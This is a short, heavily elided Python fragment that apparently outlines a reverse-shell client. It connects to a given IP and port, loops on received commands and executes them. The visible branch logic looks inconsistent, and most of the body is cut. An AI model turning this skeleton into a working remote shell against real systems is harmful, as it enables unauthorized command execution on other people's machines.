...
class MySocket:
    def __init__(self,ip,port):
        ...
        self.my_connection.connect((ip, port))  # other machine ip and channel(port)
        ...
        while True:
            ...
            try:
                if command[0] == "quit":
                    ...
                    command_output=self.command_execution(command[1])
...
my_socket_object = MySocket("127.0.0.1",8000)
